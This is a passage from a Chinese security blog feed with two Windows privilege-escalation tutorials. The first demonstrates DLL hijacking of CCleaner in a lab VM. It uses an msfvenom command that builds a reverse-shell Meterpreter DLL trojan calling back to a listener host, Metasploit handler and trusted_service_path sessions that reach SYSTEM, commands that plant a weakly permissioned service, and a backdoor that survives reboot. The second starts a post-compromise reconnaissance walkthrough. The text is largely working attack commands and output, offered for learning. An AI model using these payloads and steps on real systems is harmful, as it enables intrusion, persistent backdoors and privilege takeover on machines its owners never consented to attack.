<h4 id="通过上面的搜索路径可以看到第六点环境变量，这也是我们比较容易控制的路径，如果目标装有python，那么Path-C-Python27-就是我们可以控制的路径，我们只需要将恶意定制的DLL-文件放到这个目录就可以。"><a href="#通过上面的搜索路径可以看到第六点环境变量，这也是我们比较容易控制的路径，如果目标装有python，那么Path-C-Python27-就是我们可以控制的路径，我们只需要将恶意定制的DLL-文件放到这个目录就可以。" class="headerlink" title="通过上面的搜索路径可以看到第六点环境变量，这也是我们比较容易控制的路径，如果目标装有python，那么Path = C:\Python27 就是我们可以控制的路径，我们只需要将恶意定制的DLL 文件放到这个目录就可以。"></a>通过上面的搜索路径可以看到第六点环境变量，这也是我们比较容易控制的路径，如果目标装有python，那么Path = C:\Python27 就是我们可以控制的路径，我们只需要将恶意定制的DLL 文件放到这个目录就可以。</h4><h2 id="0x02-实战演示"><a href="#0x02-实战演示" class="headerlink" title="0x02. 实战演示"></a>0x02. 实战演示</h2><h4 id="1-首先我在知乎上随便搜了点关于Windows-中的软件，然后随便选了一个感觉可能存在DLL-劫持的软件安装到我的Windows-7-虚拟机中"><a href="#1-首先我在知乎上随便搜了点关于Windows-中的软件，然后随便选了一个感觉可能存在DLL-劫持的软件安装到我的Windows-7-虚拟机中" class="headerlink" title="1. 首先我在知乎上随便搜了点关于Windows 中的软件，然后随便选了一个感觉可能存在DLL 劫持的软件安装到我的Windows 7 虚拟机中"></a>1. 首先我在知乎上随便搜了点关于Windows 中的软件，然后随便选了一个感觉可能存在DLL 劫持的软件安装到我的Windows 7 虚拟机中</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows-%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%8B%EF%BC%89/20180410222237_MewziO_Screenshot.jpeg" alt=""></p>
<h4 id="2-然后调用工具-DllHijackAuditor-自动检测我们刚才下载的软件是否存在DLL-劫持，根据下图可以看到这里面存在一共-5-个DLL-文件可供我们恶意劫持，这是我没想到的，我确实是在网上随便搜了一个软件而已，没想到居然会这么不经摧折！"><a href="#2-然后调用工具-DllHijackAuditor-自动检测我们刚才下载的软件是否存在DLL-劫持，根据下图可以看到这里面存在一共-5-个DLL-文件可供我们恶意劫持，这是我没想到的，我确实是在网上随便搜了一个软件而已，没想到居然会这么不经摧折！" class="headerlink" title="2. 然后调用工具 DllHijackAuditor 自动检测我们刚才下载的软件是否存在DLL 劫持，根据下图可以看到这里面存在一共 5 个DLL  文件可供我们恶意劫持，这是我没想到的，我确实是在网上随便搜了一个软件而已，没想到居然会这么不经摧折！"></a>2. 然后调用工具 <a href="https://securityxploded.com/getsoftware_direct.php?id=7777" target="_blank" rel="external">DllHijackAuditor</a> 自动检测我们刚才下载的软件是否存在DLL 劫持，根据下图可以看到这里面存在一共 5 个DLL  文件可供我们恶意劫持，这是我没想到的，我确实是在网上随便搜了一个软件而已，没想到居然会这么不经摧折！</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows-%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%8B%EF%BC%89/20180410223301_Bp44of_Screenshot.jpeg" alt=""></p>
<h4 id="3-接下来我们利用msfvenom-生成文件名为ext-ms-win-kernel32-package-current-l1-1-0-dll-的-DLL-木马，用于进行DLL-劫持。"><a href="#3-接下来我们利用msfvenom-生成文件名为ext-ms-win-kernel32-package-current-l1-1-0-dll-的-DLL-木马，用于进行DLL-劫持。" class="headerlink" title="3. 接下来我们利用msfvenom 生成文件名为ext-ms-win-kernel32-package-current-l1-1-0.dll 的 DLL 木马，用于进行DLL 劫持。"></a>3. 接下来我们利用msfvenom 生成文件名为ext-ms-win-kernel32-package-current-l1-1-0.dll 的 DLL 木马，用于进行DLL 劫持。</h4><blockquote>
<p>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.175.143 lport=4444 -f dll -o /root/ext-ms-win-kernel32-package-current-l1-1-0.dll</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows-%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%8B%EF%BC%89/20180410224504_LFKxXq_Screenshot.jpeg" alt=""></p>
<h4 id="4-查看Windows-的环境变量，并将DLL-木马文件放入可控的环境变量中-这样当我们启动CCleaner-软件的时候就会调用我们的DLL-木马文件反弹shell"><a href="#4-查看Windows-的环境变量，并将DLL-木马文件放入可控的环境变量中-这样当我们启动CCleaner-软件的时候就会调用我们的DLL-木马文件反弹shell" class="headerlink" title="4. 查看Windows 的环境变量，并将DLL 木马文件放入可控的环境变量中,这样当我们启动CCleaner 软件的时候就会调用我们的DLL 木马文件反弹shell"></a>4. 查看Windows 的环境变量，并将DLL 木马文件放入可控的环境变量中,这样当我们启动CCleaner 软件的时候就会调用我们的DLL 木马文件反弹shell</h4><blockquote>
<p>echo %path% </p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows-%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%8B%EF%BC%89/20180410224735_dwsj0R_Screenshot.jpeg" alt=""></p>
<h4 id="5-启动msf-的监听模式，默默等待用户执行软件，可以看到我们现在只是普通管理员权限"><a href="#5-启动msf-的监听模式，默默等待用户执行软件，可以看到我们现在只是普通管理员权限" class="headerlink" title="5. 启动msf 的监听模式，默默等待用户执行软件，可以看到我们现在只是普通管理员权限"></a>5. 启动msf 的监听模式，默默等待用户执行软件，可以看到我们现在只是普通管理员权限</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">msf &gt; use exploit/multi/handler </div><div class="line">msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</div><div class="line">payload =&gt; windows/meterpreter/reverse_tcp</div><div class="line">msf exploit(multi/handler) &gt; set lhost 192.168.175.143</div><div class="line">lhost =&gt; 192.168.175.143</div><div class="line">msf exploit(multi/handler) &gt; set lport 4444</div><div class="line">lport =&gt; 4444</div><div class="line">msf exploit(multi/handler) &gt; run</div><div class="line"></div><div class="line">[*] Started reverse TCP handler on 192.168.175.143:4444</div></pre></td></tr></table></figure>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows-%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%8B%EF%BC%89/20180410225355_mtdLaD_Screenshot.jpeg" alt=""></p>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows-%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%8B%EF%BC%89/20180410225440_7mMEIN_Screenshot.jpeg" alt=""></p>
<h4 id="6-从meterpreter-进入shell-模式，然后我们手动构建一个存在漏洞的服务，以便后续进行提权到-SYSTEM"><a href="#6-从meterpreter-进入shell-模式，然后我们手动构建一个存在漏洞的服务，以便后续进行提权到-SYSTEM" class="headerlink" title="6. 从meterpreter 进入shell 模式，然后我们手动构建一个存在漏洞的服务，以便后续进行提权到 SYSTEM"></a>6. 从meterpreter 进入shell 模式，然后我们手动构建一个存在漏洞的服务，以便后续进行提权到 SYSTEM</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">sc create &quot;times0ng test&quot; binPath= &quot;C:\Program Files (x86)\times0ng test\just test\evil.exe&quot; start= auto</div><div class="line"></div><div class="line">cd C:\Program Files (x86)</div><div class="line"></div><div class="line">mkdir &quot;times0ng test\just test&quot;</div><div class="line"></div><div class="line">icacls &quot;C:\Program Files (x86)\times0ng test&quot; /grant Everyone:(OI)(CI)F /T</div></pre></td></tr></table></figure>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows-%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%8B%EF%BC%89/20180410230219_rieB2E_Screenshot.jpeg" alt=""></p>
<h4 id="7-调用msf-的提权模块进行提权，可以看到我们很容易就取得了SYSTEM-权限"><a href="#7-调用msf-的提权模块进行提权，可以看到我们很容易就取得了SYSTEM-权限" class="headerlink" title="7. 调用msf 的提权模块进行提权，可以看到我们很容易就取得了SYSTEM 权限"></a>7. 调用msf 的提权模块进行提权，可以看到我们很容易就取得了SYSTEM 权限</h4><blockquote>
<p>use exploit/windows/local/trusted_service_path</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">C:\Program Files (x86)&gt;exit</div><div class="line">exit</div><div class="line">meterpreter &gt; </div><div class="line">meterpreter &gt; background </div><div class="line">[*] Backgrounding session 8...</div><div class="line">msf exploit(multi/handler) &gt; use exploit/windows/local/trusted_service_path</div><div class="line">msf exploit(windows/local/trusted_service_path) &gt; set session 8</div><div class="line">session =&gt; 8</div><div class="line">msf exploit(windows/local/trusted_service_path) &gt; set payload windows/meterpreter/reverse_tcp</div><div class="line">payload =&gt; windows/meterpreter/reverse_tcp</div><div class="line">msf exploit(windows/local/trusted_service_path) &gt; set lhost 192.168.175.143</div><div class="line">lhost =&gt; 192.168.175.143</div><div class="line">msf exploit(windows/local/trusted_service_path) &gt; set lport 4444</div><div class="line">lport =&gt; 4444</div><div class="line">msf exploit(windows/local/trusted_service_path) &gt; run</div><div class="line"></div><div class="line">[*] Started reverse TCP handler on 192.168.175.143:4444 </div><div class="line">[*] Finding a vulnerable service...</div><div class="line">[*] Placing C:\Program.exe for times0ng test</div><div class="line">[*] Writing 15872 bytes to C:\Program.exe...</div><div class="line">[*] Launching service times0ng test...</div><div class="line">[*] Sending stage (179779 bytes) to 192.168.175.145</div><div class="line">[*] Meterpreter session 9 opened (192.168.175.143:4444 -&gt; 192.168.175.145:49286) at 2018-04-10 11:05:23 -0400</div><div class="line">[!] This exploit may require manual cleanup of &apos;C:\Program.exe&apos; on the target</div><div class="line"></div><div class="line">meterpreter &gt; getuid</div><div class="line">Server username: NT AUTHORITY\SYSTEM</div><div class="line">meterpreter &gt;</div></pre></td></tr></table></figure>
<h4 id="8-重启win-7-，我们的DLL-木马仍然静静地躺在那里充当着忠实可靠的后门，一旦用户执行CCleaner-就会触发木马（想象一下如果把CCleaner-换成系统服务，还是开机自动启动项，那么一旦用户重启计算机就会触发后门反弹给我们-SYSTEM-shell）"><a href="#8-重启win-7-，我们的DLL-木马仍然静静地躺在那里充当着忠实可靠的后门，一旦用户执行CCleaner-就会触发木马（想象一下如果把CCleaner-换成系统服务，还是开机自动启动项，那么一旦用户重启计算机就会触发后门反弹给我们-SYSTEM-shell）" class="headerlink" title="8. 重启win 7 ，我们的DLL 木马仍然静静地躺在那里充当着忠实可靠的后门，一旦用户执行CCleaner 就会触发木马（想象一下如果把CCleaner 换成系统服务，还是开机自动启动项，那么一旦用户重启计算机就会触发后门反弹给我们 SYSTEM shell）"></a>8. 重启win 7 ，我们的DLL 木马仍然静静地躺在那里充当着忠实可靠的后门，一旦用户执行CCleaner 就会触发木马（想象一下如果把CCleaner 换成系统服务，还是开机自动启动项，那么一旦用户重启计算机就会触发后门反弹给我们 SYSTEM shell）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; reboot</div><div class="line">Rebooting...</div><div class="line">meterpreter &gt; [*] 192.168.175.145 - Meterpreter session 8 closed.  Reason: Died</div><div class="line"></div><div class="line">meterpreter &gt; </div><div class="line">[*] 192.168.175.145 - Meterpreter session 9 closed.  Reason: Died</div><div class="line"></div><div class="line">msf exploit(windows/local/trusted_service_path) &gt; use exploit/multi/handler </div><div class="line">msf exploit(multi/handler) &gt; run</div><div class="line"></div><div class="line">[*] Started reverse TCP handler on 192.168.175.143:4444 </div><div class="line">[*] Sending stage (179779 bytes) to 192.168.175.145</div><div class="line">[*] Meterpreter session 10 opened (192.168.175.143:4444 -&gt; 192.168.175.145:49160) at 2018-04-10 11:12:24 -0400</div><div class="line"></div><div class="line">meterpreter &gt; getuid</div><div class="line">Server username: WIN-CKN6B7H8THF\times0ng</div><div class="line">meterpreter &gt;</div></pre></td></tr></table></figure>
<h2 id="0x03-结语"><a href="#0x03-结语" class="headerlink" title="0x03. 结语"></a>0x03. 结语</h2><h4 id="希望大家能够喜欢，有更好的想法欢迎留言，或者进群交流！"><a href="#希望大家能够喜欢，有更好的想法欢迎留言，或者进群交流！" class="headerlink" title="希望大家能够喜欢，有更好的想法欢迎留言，或者进群交流！"></a>希望大家能够喜欢，有更好的想法欢迎留言，或者进群交流！</h4>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-序言&quot;&gt;&lt;a href=&quot;#0x00-序言&quot; class=&quot;headerlink&quot; title=&quot;0x00. 序言&quot;&gt;&lt;/a&gt;0x00. 序言&lt;/h2&gt;&lt;h4 id=&quot;今天给大家讲一讲我自己的骚姿势，虽然技术内容都不是我自己发明的，但是我将几种技术杂糅在一起之后居然产生了让我自己都感到惊讶的效果！！&quot;&gt;&lt;a href=&quot;#今天给大家讲一讲我自己的骚姿势，虽然技术内容都不是我自己发明的，但是我将几种技术杂糅在一起之后居然产生了让我自己都感到惊讶的效果！！&quot; class=&quot;headerlink&quot; title=&quot;今天给大家讲一讲我自己的骚姿势，虽然技术内容都不是我自己发明的，但是我将几种技术杂糅在一起之后居然产生了让我自己都感到惊讶的效果！！&quot;&gt;&lt;/a&gt;今天给大家讲一讲我自己的骚姿势，虽然技术内容都不是我自己发明的，但是我将几种技术杂糅在一起之后居然产生了让我自己都感到惊讶的效果！！&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Windows 提权基础（上）</title>
    <link href="http://TimeS0ng.github.io/2018/04/13/Windows-%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
    <id>http://TimeS0ng.github.io/2018/04/13/Windows-提权基础（上）/</id>
    <published>2018-04-13T09:13:10.000Z</published>
    <updated>2018-12-18T15:35:08.900Z</updated>
    
    <content type="html"><![CDATA[<h2 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h2><h4 id="本篇教程是笔者翻译国外大牛fuzzysecurity-的文章再加上个人的理解写出的关于Windows-提权基础的文章，其中有些地方因为不太实用所以做了适当修改，感谢-hl0rey-的帮助和建议。"><a href="#本篇教程是笔者翻译国外大牛fuzzysecurity-的文章再加上个人的理解写出的关于Windows-提权基础的文章，其中有些地方因为不太实用所以做了适当修改，感谢-hl0rey-的帮助和建议。" class="headerlink" title="本篇教程是笔者翻译国外大牛fuzzysecurity 的文章再加上个人的理解写出的关于Windows 提权基础的文章，其中有些地方因为不太实用所以做了适当修改，感谢@hl0rey 的帮助和建议。"></a>本篇教程是笔者翻译国外<a href="http://www.fuzzysecurity.com/tutorials/16.html" target="_blank" rel="external">大牛fuzzysecurity 的文章</a>再加上个人的理解写出的关于Windows 提权基础的文章，其中有些地方因为不太实用所以做了适当修改，感谢@hl0rey 的帮助和建议。</h4><a id="more"></a>
<h4 id="Indispensable-Resources"><a href="#Indispensable-Resources" class="headerlink" title="Indispensable Resources:"></a>Indispensable Resources:</h4><ul>
<li>Encyclopaedia Of Windows Privilege Escalation (Brett Moore) -<a href="https://www.youtube.com/watch?v=kMG8IsCohHA" target="_blank" rel="external">here</a></li>
<li>Windows Attacks: AT is the new black (Chris Gates &amp; Rob Fuller) -<a href="https://www.youtube.com/watch?v=_8xJaaQlpBo" target="_blank" rel="external">here</a></li>
<li>Elevating privileges by exploiting weak folder permissions (Parvez Anwar) -<a href="http://www.greyhathacker.net/?p=738" target="_blank" rel="external">here</a></li>
</ul>
<h2 id="Δt-for-t0-to-t3-Initial-Information-Gathering"><a href="#Δt-for-t0-to-t3-Initial-Information-Gathering" class="headerlink" title="Δt for t0 to t3 - Initial Information Gathering"></a>Δt for t0 to t3 - Initial Information Gathering</h2><h4 id="这个教程从Windows-的低权限shell-开始讲述如何提权。我们可能利用某个EXP-或者从客户端攻击取得了一个反弹shell-。最开始我们还不了解这台计算机，不知道它是干什么用的，连接到哪里，有什么等级的权限或者甚至不知道它是什么操作系统。"><a href="#这个教程从Windows-的低权限shell-开始讲述如何提权。我们可能利用某个EXP-或者从客户端攻击取得了一个反弹shell-。最开始我们还不了解这台计算机，不知道它是干什么用的，连接到哪里，有什么等级的权限或者甚至不知道它是什么操作系统。" class="headerlink" title="这个教程从Windows 的低权限shell 开始讲述如何提权。我们可能利用某个EXP 或者从客户端攻击取得了一个反弹shell 。最开始我们还不了解这台计算机，不知道它是干什么用的，连接到哪里，有什么等级的权限或者甚至不知道它是什么操作系统。"></a>这个教程从Windows 的低权限shell 开始讲述如何提权。我们可能利用某个EXP 或者从客户端攻击取得了一个反弹shell 。最开始我们还不了解这台计算机，不知道它是干什么用的，连接到哪里，有什么等级的权限或者甚至不知道它是什么操作系统。</h4><h4 id="最初我们希望快速的收集一些重要的信息，以便我们能够评估我们所处的状况，并作出正确的判断！"><a href="#最初我们希望快速的收集一些重要的信息，以便我们能够评估我们所处的状况，并作出正确的判断！" class="headerlink" title="最初我们希望快速的收集一些重要的信息，以便我们能够评估我们所处的状况，并作出正确的判断！"></a>最初我们希望快速的收集一些重要的信息，以便我们能够评估我们所处的状况，并作出正确的判断！</h4><h4 id="首先查看连接的是什么操作系统："><a href="#首先查看连接的是什么操作系统：" class="headerlink" title="首先查看连接的是什么操作系统："></a>首先查看连接的是什么操作系统：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">//英文系统</div><div class="line">//C:\Windows\system32&gt; systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</div><div class="line">//中文系统</div><div class="line">C:\Windows\system32&gt; systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</div><div class="line">OS 名称:                   Microsoft Windows 7 家庭普通版</div><div class="line">OS 版本:                6.1.7601 Service Pack 1 Build 7601</div></pre></td></tr></table></figure>
<h4 id="接下来查看主机名和当前shell-的用户名："><a href="#接下来查看主机名和当前shell-的用户名：" class="headerlink" title="接下来查看主机名和当前shell 的用户名："></a>接下来查看主机名和当前shell 的用户名：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">C:\Windows\system32&gt; hostname</div><div class="line">b33f</div><div class="line"></div><div class="line">C:\Windows\system32&gt; echo %username%</div><div class="line">user1</div></pre></td></tr></table></figure>
<h4 id="现在我们已经有了基本信息，让我们继续列出其他的用户账号名并查看我们自己更详细的信息。能够看到我们的账号user1-不在localgroup-Administrators-中，不是管理员账号。"><a href="#现在我们已经有了基本信息，让我们继续列出其他的用户账号名并查看我们自己更详细的信息。能够看到我们的账号user1-不在localgroup-Administrators-中，不是管理员账号。" class="headerlink" title="现在我们已经有了基本信息，让我们继续列出其他的用户账号名并查看我们自己更详细的信息。能够看到我们的账号user1 不在localgroup Administrators 中，不是管理员账号。"></a>现在我们已经有了基本信息，让我们继续列出其他的用户账号名并查看我们自己更详细的信息。能够看到我们的账号user1 不在localgroup Administrators 中，不是管理员账号。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">C:\Windows\system32&gt; net users</div><div class="line"></div><div class="line">User accounts for \\B33F</div><div class="line"></div><div class="line">-------------------------------------------------------------------------------</div><div class="line">Administrator            b33f                     Guest</div><div class="line">user1</div><div class="line">The command completed successfully.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; net user user1</div><div class="line"></div><div class="line">User name                    user1</div><div class="line">Full Name</div><div class="line">Comment</div><div class="line">User&apos;s comment</div><div class="line">Country code                 000 (System Default)</div><div class="line">Account active               Yes</div><div class="line">Account expires              Never</div><div class="line"></div><div class="line">Password last set            1/11/2014 7:47:14 PM</div><div class="line">Password expires             Never</div><div class="line">Password changeable          1/11/2014 7:47:14 PM</div><div class="line">Password required            Yes</div><div class="line">User may change password     Yes</div><div class="line"></div><div class="line">Workstations allowed         All</div><div class="line">Logon script</div><div class="line">User profile</div><div class="line">Home directory</div><div class="line">Last logon                   1/11/2014 8:05:09 PM</div><div class="line"></div><div class="line">Logon hours allowed          All</div><div class="line"></div><div class="line">Local Group Memberships      *Users</div><div class="line">Global Group memberships     *None</div><div class="line">The command completed successfully.</div></pre></td></tr></table></figure>
<h4 id="以上就是我们目前需要了解的用户和权限信息。接下来我们查看网络配置信息。"><a href="#以上就是我们目前需要了解的用户和权限信息。接下来我们查看网络配置信息。" class="headerlink" title="以上就是我们目前需要了解的用户和权限信息。接下来我们查看网络配置信息。"></a>以上就是我们目前需要了解的用户和权限信息。接下来我们查看网络配置信息。</h4><h4 id="首先我们查看可用的网卡和路由表"><a href="#首先我们查看可用的网卡和路由表" class="headerlink" title="首先我们查看可用的网卡和路由表"></a>首先我们查看可用的网卡和路由表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div></pre></td><td class="code"><pre><div class="line">C:\Windows\system32&gt; ipconfig /all</div><div class="line"></div><div class="line">Windows IP Configuration</div><div class="line"></div><div class="line">   Host Name . . . . . . . . . . . . : b33f</div><div class="line">   Primary Dns Suffix  . . . . . . . :</div><div class="line">   Node Type . . . . . . . . . . . . : Hybrid</div><div class="line">   IP Routing Enabled. . . . . . . . : No</div><div class="line">   WINS Proxy Enabled. . . . . . . . : No</div><div class="line"></div><div class="line">Ethernet adapter Bluetooth Network Connection:</div><div class="line"></div><div class="line">   Media State . . . . . . . . . . . : Media disconnected</div><div class="line">   Connection-specific DNS Suffix  . :</div><div class="line">   Description . . . . . . . . . . . : Bluetooth Device (Personal Area Network)</div><div class="line">   Physical Address. . . . . . . . . : 0C-84-DC-62-60-29</div><div class="line">   DHCP Enabled. . . . . . . . . . . : Yes</div><div class="line">   Autoconfiguration Enabled . . . . : Yes</div><div class="line">   </div><div class="line">Ethernet adapter Local Area Connection:</div><div class="line"></div><div class="line">   Connection-specific DNS Suffix  . :</div><div class="line">   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection</div><div class="line">   Physical Address. . . . . . . . . : 00-0C-29-56-79-35</div><div class="line">   DHCP Enabled. . . . . . . . . . . : Yes</div><div class="line">   Autoconfiguration Enabled . . . . : Yes</div><div class="line">   Link-local IPv6 Address . . . . . : fe80::5cd4:9caf:61c0:ba6e%11(Preferred)</div><div class="line">   IPv4 Address. . . . . . . . . . . : 192.168.0.104(Preferred)</div><div class="line">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</div><div class="line">   Lease Obtained. . . . . . . . . . : Saturday, January 11, 2014 3:53:55 PM</div><div class="line">   Lease Expires . . . . . . . . . . : Sunday, January 12, 2014 3:53:55 PM</div><div class="line">   Default Gateway . . . . . . . . . : 192.168.0.1</div><div class="line">   DHCP Server . . . . . . . . . . . : 192.168.0.1</div><div class="line">   DHCPv6 IAID . . . . . . . . . . . : 234884137</div><div class="line">   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-18-14-24-1D-00-0C-29-56-79-35</div><div class="line">   DNS Servers . . . . . . . . . . . : 192.168.0.1</div><div class="line">   NetBIOS over Tcpip. . . . . . . . : Enabled</div><div class="line"></div><div class="line">C:\Windows\system32&gt; route print</div><div class="line"></div><div class="line">===========================================================================</div><div class="line">Interface List</div><div class="line"> 18...0c 84 dc 62 60 29 ......Bluetooth Device (Personal Area Network)</div><div class="line"> 13...00 ff 0c 0d 4f ed ......TAP-Windows Adapter V9</div><div class="line"> 11...00 0c 29 56 79 35 ......Intel(R) PRO/1000 MT Network Connection</div><div class="line">  1...........................Software Loopback Interface 1</div><div class="line"> 16...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter</div><div class="line"> 15...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter #2</div><div class="line"> 19...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter #3</div><div class="line"> 14...00 00 00 00 00 00 00 e0 Teredo Tunneling Pseudo-Interface</div><div class="line">===========================================================================</div><div class="line"></div><div class="line">IPv4 Route Table</div><div class="line">===========================================================================</div><div class="line">Active Routes:</div><div class="line">Network Destination        Netmask          Gateway       Interface  Metric</div><div class="line">          0.0.0.0          0.0.0.0      192.168.0.1    192.168.0.104     10</div><div class="line">        127.0.0.0        255.0.0.0         On-link         127.0.0.1    306</div><div class="line">        127.0.0.1  255.255.255.255         On-link         127.0.0.1    306</div><div class="line">  127.255.255.255  255.255.255.255         On-link         127.0.0.1    306</div><div class="line">      192.168.0.0    255.255.255.0         On-link     192.168.0.104    266</div><div class="line">    192.168.0.104  255.255.255.255         On-link     192.168.0.104    266</div><div class="line">    192.168.0.255  255.255.255.255         On-link     192.168.0.104    266</div><div class="line">        224.0.0.0        240.0.0.0         On-link         127.0.0.1    306</div><div class="line">        224.0.0.0        240.0.0.0         On-link     192.168.0.104    266</div><div class="line">  255.255.255.255  255.255.255.255         On-link         127.0.0.1    306</div><div class="line">  255.255.255.255  255.255.255.255         On-link     192.168.0.104    266</div><div class="line">===========================================================================</div><div class="line">Persistent Routes:</div><div class="line">  None</div><div class="line"></div><div class="line">IPv6 Route Table</div><div class="line">===========================================================================</div><div class="line">Active Routes:</div><div class="line"> If Metric Network Destination      Gateway</div><div class="line"> 14     58 ::/0                     On-link</div><div class="line">  1    306 ::1/128                  On-link</div><div class="line"> 14     58 2001::/32                On-link</div><div class="line"> 14    306 2001:0:5ef5:79fb:8d2:b4e:3f57:ff97/128</div><div class="line">                                    On-link</div><div class="line"> 11    266 fe80::/64                On-link</div><div class="line"> 14    306 fe80::/64                On-link</div><div class="line"> 14    306 fe80::8d2:b4e:3f57:ff97/128</div><div class="line">                                    On-link</div><div class="line"> 11    266 fe80::5cd4:9caf:61c0:ba6e/128</div><div class="line">                                    